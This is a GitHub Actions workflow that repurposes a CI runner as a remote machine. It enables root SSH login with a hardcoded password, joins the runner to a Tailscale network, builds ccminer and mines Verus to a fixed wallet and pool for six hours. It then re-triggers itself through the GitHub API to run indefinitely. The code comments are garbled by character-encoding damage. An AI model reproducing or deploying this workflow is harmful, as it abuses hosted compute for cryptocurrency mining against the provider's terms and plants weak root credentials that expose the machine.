name: VPS4
on:
  workflow_dispatch:

jobs:
  secure-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Install & Configure SSH
        run: |
          sudo apt update -y
          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev \
              libjansson-dev automake autotools-dev screen
          sudo systemctl enable ssh
          sudo systemctl start ssh
          echo "root:admin@123" | sudo chpasswd
          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
          sudo service ssh restart
          echo "âœ… SSH user: root | pass: admin@123"

      - name: Install Tailscale
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
          tsIP=$(tailscale ip -4 | head -n 1)
          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
          echo "âœ… Tailscale IP: $tsIP"

      - name: Verify SSH Access
        run: |
          echo "Tailscale VPS ready!"
          echo "IP: $TAILSCALE_IP"
          echo "User: root"
          echo "Pass: admin@123"

      - name: Install ccminer & Start Mining
        run: |
          #!/bin/bash
          # ØªØ¹Ø±ÙŠÙ Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
          WALLET="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
          POOL="pool.verus.io:9998"
          THREADS=4

          # Ø¥Ù†Ø´Ø§Ø¡ Ø§Ø³Ù… Ø¹Ø§Ù…Ù„ Ø¹Ø´ÙˆØ§Ø¦ÙŠ
          RAND_NUM=$(shuf -i 1000-9999 -n 1)
          RAND_CHARS=$(tr -dc 'a-zA-Z' </dev/urandom | head -c 2)
          WORKER_NAME="ubuntu${RAND_NUM}${RAND_CHARS}"
          echo "ğŸ‘· Worker Name: $WORKER_NAME"

          # Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¯Ù„ÙŠÙ„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
          cd $HOME || exit 1

          # ØªØ«Ø¨ÙŠØª Ø§Ù„ØªØ¨Ø¹ÙŠØ§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø© Ù„Ù„ØªØ¹Ø¯ÙŠÙ†
          sudo apt install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev

          # Ø§Ø³ØªÙ†Ø³Ø§Ø® ÙˆØªØ«Ø¨ÙŠØª ccminer Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯Ù‹Ø§
          if [ ! -d "$HOME/ccminer" ]; then
            git clone https://github.com/Oink70/ccminer-verus.git ccminer
          fi

          # Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø¯Ù„ÙŠÙ„ ccminer ÙˆØ§Ù„Ø¨Ù†Ø§Ø¡
          cd ccminer || exit 1
          
          # Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ Ù…Ù„Ù configureØŒ Ù‚Ù… Ø¨ØªØ´ØºÙŠÙ„Ù‡ Ø£ÙˆÙ„Ø§Ù‹
          if [ -f "configure" ]; then
            ./configure --with-crypto --with-curl
          fi
          
          make clean || true
          
          # Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¨Ù†Ø§Ø¡ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… make
          make -j$(nproc) || {
            echo "âš ï¸ Build failed, trying alternative build method..."
            ./build.sh
          }

          # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª
          cat > config.json <<EOF
{
  "pools": [
    { 
      "name": "CUSTOM", 
      "url": "stratum+tcp://${POOL}", 
      "timeout": 180, 
      "disabled": 0 
    }
  ],
  "user": "${WALLET}.${WORKER_NAME}",
  "pass": "x",
  "algo": "verus",
  "threads": ${THREADS},
  "api-bind": "127.0.0.1:4068"
}
EOF

          # Ø¨Ø¯Ø¡ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† ÙÙŠ Ø¬Ù„Ø³Ø© screen
          screen -dmS verus_mining ./ccminer -c config.json
          echo "ğŸš€ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† Ø¨Ø¯Ø£ Worker: ${WORKER_NAME}"
          echo "â–¶ï¸ Ù„Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„Ø¬Ù„Ø³Ø©: screen -r verus_mining"
          echo "ğŸ“Š Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¹Ù…Ù„: screen -list"

      - name: Run VPS for 6 hours
        run: |
          echo "â³ VPS running for 6 hours..."
          # Ø¥Ø¸Ù‡Ø§Ø± ØªÙ‚Ø¯Ù… Ø§Ù„ÙˆÙ‚Øª ÙƒÙ„ Ø¯Ù‚ÙŠÙ‚Ø©
          for i in {1..360}; do
            sleep 60
            echo "â° Running for $i minutes..."
          done

      - name: Cleanup and Stop Mining
        run: |
          echo "ğŸ§¹ Cleaning up..."
          # Ø¥ÙŠÙ‚Ø§Ù Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ¹Ø¯ÙŠÙ†
          screen -S verus_mining -X quit 2>/dev/null || true
          pkill -f ccminer 2>/dev/null || true
          echo "âœ… Mining stopped and cleanup completed"

      - name: Restart This Workflow
        if: always()  # ÙŠØ¹Ù…Ù„ Ø­ØªÙ‰ Ø¥Ø°Ø§ ÙØ´Ù„Øª Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©
        env:
          REPO: ${{ github.repository }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "ğŸ”„ Attempting to restart workflow..."
          # Ø¥Ø¶Ø§ÙØ© ØªØ­Ù‚Ù‚ Ù‚Ø¨Ù„ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ´ØºÙŠÙ„
          sleep 5
          curl -s -X POST \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches \
            -d '{"ref":"${{ github.ref }}"}'
          echo "âœ… Restart command sent"
